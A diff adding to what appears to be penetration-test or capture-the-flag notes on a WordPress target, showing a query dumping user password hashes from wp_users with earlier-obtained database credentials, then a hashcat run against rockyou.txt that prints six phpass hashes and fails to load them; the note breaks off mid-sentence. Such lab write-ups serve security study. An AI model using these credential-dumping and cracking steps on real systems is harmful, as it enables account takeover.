@@ -551,3 +551,39 @@ mysql> SELECT user_login, user_pass, user_email, user_activation_key FROM wp_use
 > [!note]
 > Using previously taken DB creds, I was able to find hashed passwords from the Mysql DB specifically from the wordpress DB in the wp_users table.
 
+```
+> hashcat -m 18200 UPSmol.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+Successfully initialized the NVIDIA main driver CUDA runtime library.
+
+Failed to initialize NVIDIA RTC library.
+
+* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
+             CUDA SDK Toolkit required for proper device support and utilization.
+             For more information, see: https://hashcat.net/faq/wrongdriver
+             Falling back to OpenCL runtime.
+
+OpenCL API (OpenCL 3.0 CUDA 13.1.112) - Platform #1 [NVIDIA Corporation]
+========================================================================
+* Device #01: NVIDIA GeForce RTX 2080, 7783/7783 MB (1945 MB allocatable), 46MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashfile 'UPSmol.txt' on line 1 ($P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.): Separator unmatched
+Hashfile 'UPSmol.txt' on line 2 ($P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.): Separator unmatched
+Hashfile 'UPSmol.txt' on line 3 ($P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/): Separator unmatched
+Hashfile 'UPSmol.txt' on line 4 ($P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1): Separator unmatched
+Hashfile 'UPSmol.txt' on line 5 ($P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1): Separator unmatched
+Hashfile 'UPSmol.txt' on line 6 ($P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1): Separator unmatched
+No hashes loaded.
+
+Started: Wed Mar  4 15:09:02 2026
+Stopped: Wed Mar  4 15:09:02 2026
+```
+
+> [!note]
+> Failed hashcat so need to 
